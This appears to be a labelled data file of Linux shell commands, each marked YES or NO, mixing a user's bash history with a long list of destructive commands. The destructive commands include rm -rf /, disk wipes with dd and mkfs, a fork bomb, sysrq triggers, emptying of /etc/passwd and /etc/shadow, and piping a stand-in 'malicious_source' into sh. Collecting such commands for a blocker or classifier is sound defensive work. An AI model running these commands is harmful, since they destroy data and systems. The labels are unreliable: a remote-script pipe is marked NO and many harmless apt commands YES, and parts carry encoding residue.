cat /sys/bus/usb/devices/usb1/power/control                    NO
cat /sys/bus/usb/devices/usb1/power/runtime_status                    NO
cat /sys/bus/usb/devices/usb2/power/runtime_status                    NO
cat /sys/bus/usb/devices/usb3/power/runtime_status                    NO
cat /sys/bus/usb/devices/usb4/power/runtime_status                    NO
./matlab                     NO
apt search ptyxis                   NO
bash -c  "$(wget -qO- https://git.io/vQgMr)"                  NO
cat .history                    NO
cat /sys/bus/usb/devices/usb2/power/runtime_                    NO
cat /sys/bus/usb/devices/usb2/power/runtime_status                    NO
cat bad_commands.sh                    NO
cat bad_commands.sh                    NO
cat commands.sh                    NO
cat my-hist.sh | sort | uniq                NO
cat my-hist.sh | sort | uniq > my-hist.sh              NO
cat my-hist.sh | uniq                  NO
cd ..                    NO
cd /media/catalin/                    NO
cd 5C2C577E2C57525E/                    NO
cd Controllers/                    NO
cd Do                    NO
cd Documents/                    NO
cd Downloads/                    NO
cd MATLAB/bin/                    NO
cd Migrations/                    NO
cd OnlineEbookReader.Server/                    NO
cd OnlineEbookReader/                    NO
cd Projects/                    NO
cd Projects/bad-shell/                    NO
cd User/source/                    NO
cd Users/                    NO
cd bad-shell/                    NO
cd onlineebookreader.client/                    NO
cd repo                    NO
cd repos                    NO
cd repos/                    NO
cd repos/OnlineEbookReader/                    NO
cd uploads/                    NO
cd wwwroot/                    NO
clear                     NO
cp ~/.bash_history my-hist.sh                   NO
curl --insecure -X 'GET'   'https://localhost:5108/Books/search'   -H 'accept: text/plain'   -H 'Content-Type: application/json'   -d "'""string""'" NO
curl --insecure -X 'GET'   'https://localhost:55942/Books/search'   -H 'accept: text/plain'   -H 'Content-Type: application/json'   -d "'""string""'" NO
curl --insecure -X 'GET'   'https://localhost:55942/WeatherForecast'   -H 'accept: application/json'          NO
curl --insecure -X 'POST'   'https://localhost:7291/Books/UploadBook'   -H 'accept: */*'   -H 'Content-Type: multipart/form-data'   -F 'file=@django5.epub;type=application/epub+zip' NO
curl --insecure https://localhost:55942/Books                   NO
curl --insecure https://localhost:7291/Books                   NO
curl --insecure https://localhost:7291/books                   NO
curl -X 'GET'   'http://localhost:510/Books/search?searchParam=fooo'   -H 'accept: text/plain'           NO
curl -X 'GET'   'http://localhost:5108/Books/search?searchParam=fooo'   -H 'accept: text/plain'           NO
curl -X 'GET'   'http://localhost:55942/WeatherForecast'   -H 'accept: application/json'           NO
curl -X 'GET'   'https://localhost:5108/Books/search'   -H 'accept: text/plain'   -H 'Content-Type: application/json'   -d "'""string""'"  NO
curl -X 'GET'   'https://localhost:55942/Books'   --insecure             NO
curl -X 'GET'   'https://localhost:55942/Books'   -H 'accept: application/json' --insecure          NO
curl -X 'GET'   'https://localhost:55942/Books'   -H 'accept: text/plain' --insecure          NO
curl -X 'GET'   'https://localhost:55942/Books/search?searchParam=fooo'   -H 'accept: text/plain'           NO
curl -X 'GET'   'https://localhost:55942/Books/search?searchParam=fooo'   -H 'accept: text/plain' --insecure          NO
curl -X 'GET'   'https://localhost:55942/WeatherForecast'   -H 'accept: application/json'           NO
curl -X 'GET'   'https://localhost:7291/Books/search?searchParam=fooo'   -H 'accept: text/plain' --insecure          NO
curl -X 'POST'   'https://localhost:55942/Books/UploadBook'   -H 'accept: */*'   -H 'Content-Type: multipart/form-data'   -F 'file=@django5.epub;type=application/epub+zip'  NO
curl -X 'POST'   'https://localhost:55942/Books/UploadBook'   -H 'accept: */*'   -H 'Content-Type: multipart/form-data'   -F 'file=@django5.epub;type=application/epub+zip' --insecure NO
curl -X 'POST'   'https://localhost:7291/Books/UploadBook'   -H 'accept: */*'   -H 'Content-Type: multipart/form-data'   -F 'file=@django5.epub;type=application/epub+zip'  NO
curl -k -X 'GET'   'https://localhost:55942/WeatherForecast'   -H 'accept: application/json'          NO
curl -k -X 'GET'   'https://localhost:55942/books'   -H 'accept: application/json'          NO
dmesg | grep usb                  NO
dotnet run                    NO
echo on >  /sys/bus/usb/devices/usb1/power/control                 NO
echo $HISTFILE                    NO
gemini                     NO
git clone git@github.com:brownbishop/OnlineEbookReader.git                   NO
git restore Program.cs                   NO
history                     NO
ls;                     NO
man man                    NO
mkdir bad-shell                    NO
npm run dev                   NO
npm run dve                   NO
nvim .bash_history                    NO
nvim .bash_history-*tmp                    NO
nvim .bash_history-21916.tmp                    NO
nvim .bash_history-53680.tmp                    NO
nvim BooksController.cs                    NO
nvim Controllers/                    NO
nvim Controllers/BooksController.cs                    NO
nvim OnlineEbookReader.Server.csproj                    NO
nvim Pro                    NO
nvim Program.cs                    NO
nvim bad_commands.sh                    NO
nvim bad_commands.sh                    NO
nvim commands.sh                    NO
nvim commands.sh                    NO
nvim commands2.sh                    NO
nvim my-hist.sh                    NO
nvim my-hist.sh                    NO
nvim onlineebookreader.client/                    NO
nvim repos/OnlineEbookReader/OnlineEbookReader.Server/Controllers/BooksController.cs                    NO
ping google.com                    NO
ptyxis                     NO
rm -fr OnlineEbookReader/                   NO
sort commands.sh                    NO
sort commands.sh > commands2.sh                  NO
sudo apt install ./Insomnia.Core-11.6.1.deb                  YES
sudo apt install ptyxis                  YES
sudo apt update && sudo apt upgrade               YES
sudo dmesg | grep usb                 YES
sudo echo on > /sys/bus/usb/devices/usb1/power/control                 YES
sudo su                    YES
systemctl poweroff                    YES
vim                     YES
rm -rf /                   YES
rm -rf *                   YES
rm -rf .                   YES
rm -rf some_directory/ *                  YES
dd if=/dev/zero of=/dev/sda                   YES
mkfs.ext4 /dev/sda                    YES
command > /dev/sda                   YES
mv directory /dev/null                   YES
:(){ :|:& };:                   YES
kill -9 -1                   YES
shutdown now                    YES
reboot                     YES
chmod -R 777 /                  YES
wget http://malicious_source -O- | sh                 YES
curl http://malicious_source | sh                  YES
echo some_content > /etc/passwd                  YES
history | sh                   YES
crontab -r                    YES
find / -name something -delete                 YES
set -o noclobber                   YES
dd if=/dev/random of=/dev/sda                   YES
cat /dev/zero > /dev/sda                  YES
mkfs.xfs /dev/sda                    YES
mkfs.btrfs /dev/sda                    YES
fdisk /dev/sda                    YES
gdisk /dev/sda                    YES
parted /dev/sda                    YES
cfdisk /dev/sda                    YES
shred /dev/sda                    YES
wipefs -a /dev/sda                   YES
badblocks -w /dev/sda                   YES
hdparm --write-sector 0 /dev/sda                  YES
sg_format --format /dev/sda                   YES
nvme format /dev/nvme0n1                   YES
dd if=/dev/urandom of=/dev/kmem                   YES
echo c > /proc/sysrq-trigger                  YES
echo b > /proc/sysrq-trigger                  YES
echo o > /proc/sysrq-trigger                  YES
echo s > /proc/sysrq-trigger                  YES
echo u > /proc/sysrq-trigger                  YES
echo 1 > /proc/sys/kernel/panic                  YES
cat /dev/urandom > /dev/port                  YES
cat /dev/mem > /dev/port                  YES
cat /dev/kmem > /dev/port                  YES
dd if=/dev/mem of=/dev/null                   YES
dd if=/dev/kmem of=/dev/null                   YES
dd if=/dev/port of=/dev/null                   YES
dd if=/dev/zero of=/dev/mem                   YES
dd if=/dev/zero of=/dev/kmem                   YES
dd if=/dev/zero of=/dev/port                   YES
dd if=/dev/random of=/dev/mem                   YES
dd if=/dev/random of=/dev/kmem                   YES
dd if=/dev/random of=/dev/port                   YES
dd if=/dev/urandom of=/dev/mem                   YES
dd if=/dev/urandom of=/dev/kmem                   YES
dd if=/dev/urandom of=/dev/port                   YES
dd if=/dev/zero of=/boot/vmlinuz                   YES
dd if=/dev/random of=/boot/vmlinuz                   YES
dd if=/dev/urandom of=/boot/vmlinuz                   YES
dd if=/dev/zero of=/lib/modules/$(uname -r)                  YES
dd if=/dev/random of=/lib/modules/$(uname -r)                  YES
dd if=/dev/urandom of=/lib/modules/$(uname -r)                  YES
rm -rf /boot                   YES
rm -rf /etc                   YES
rm -rf /lib                   YES
rm -rf /usr                   YES
rm -rf /var                   YES
rm -rf /bin                   YES
rm -rf /sbin                   YES
rm -rf /home                   YES
find / -type f -exec shred {} \;              YES
find / -type f -exec rm {} \;              YES
find / -type d -exec rm -r {} \;             YES
find / -type f -delete                 YES
find / -type d -delete                 YES
find / -perm 777 -exec rm -r {} \;             YES
find / -perm 666 -exec rm -r {} \;             YES
find / -perm 444 -exec rm -r {} \;             YES
find / -name .* -exec rm -r {} \;             YES
find / -name * -exec rm -r {} \;             YES
chown root:root /                   YES
chown -R root:root /                  YES
chmod 0 /                   YES
chmod -R 0 /                  YES
chmod 666 /etc/shadow                   YES
chmod 666 /etc/passwd                   YES
chmod 777 /etc/sudoers                   YES
echo  > /etc/sudoers                  YES
echo root::0:0:root:/root:/bin/bash > /etc/passwd                  YES
echo root::: > /etc/shadow                  YES
command                     YES
apt                     YES
ubuntu+AC0-drivers                     YES
apt  nvidia+AC0-415                   NO
nvidia+AC0-smi                     YES
reboot                     YES
systemctl  network+AC0-manager                   NO
lspci  grep network                  NO
lspci  grep Network                  NO
lspci                     NO
lshw  network                   NO
lsmod                     NO
modprobe iwlwifi                    YES
systemctl restart network+AC0-manager                   YES
rfkill list all                   YES
cat /etc/network/interfaces                    NO
mod                     NO
modinfo iwlwifi +AHw- grep 3165                 NO
modinfo iwlwifi                    NO
modinfo iwlwifi +AHw- grep 3165                 NO
lshw +AC0-class network                   NO
nvidia+AC0-smi                     NO
mod                     NO
lspci +AHw- grep Network                  YES
cat /etc/network/interfaces                    NO
lspci                     NO
lspci +AC0-v                    YES
modinfo alx                    YES
apt install linux+AC0-generic+AC0-hwe+AC0-16.04                   YES
echo 1969 e0b1 +AHw- sudo tee /sys/bus/pci/drivers/alx/new+AF8-id               YES
cat /sys/bus/pci/drivers/alx/new+AF8-id                    YES
uname +AC0-a                    YES
apt update                    YES
apt upgrade                    YES
apt search linux                   YES
apt search linux+AC0-kernel                   YES
apt search linux+AC0-kernel                   YES
apt info linux                   YES
apt show linux                   YES
apt search li                   YES
apt search linux+AC0-gener                   YES
apt show                    YES
apt install linux+AC0-generic                   NO
reboot                     NO
lshw +AC0-class network                   NO
nvidia+AC0-smi                     YES
apt update                    YES
apt upgrade                    YES
apt update                    YES
apt+AC0-get install default+AC0-jdk +AC0-y                  YES
apt+AC0-get install default+AC0-jdk +AC0-                  YES
apt+AC0-get install default+AC0-jdk                   YES
apt+AC0-get install default+AC0-jdk +AC0-y                  YES
mkdir /var/www/html/test+AF8-project                    NO
pwd                     NO
ll                     NO
cd ..                    NO
ll                     YES
chmod +AC0-R 777 html                  NO
ll                     YES
apt install phpmyadmin +AC0-y                  YES
systemctl restart apache2                   NO
ipconfig                     NO
ifconfig                     NO
locate phpmyadmin                    NO
updatedb                     NO
locate phpmyadmin                    YES
cat /etc/apache2/conf+AC0-enabled/phpmyadmin.conf                    NO
php +AC0-m +AHw- grep mysql                 NO
php +AC0-v                    YES
systemctl restart apache2                   YES
systemctl restart mysql                   NO
vim                     YES
apt install vim                   YES
vim /etc/apache2/apache2.conf                    YES
systemctl restart mysql                   YES
systemctl restart apache2                   YES
vim /etc/apache2/apache2.conf                    NO
exit                     YES
apt+AC0-get install default+AC0-jre                   NO
exit                     YES
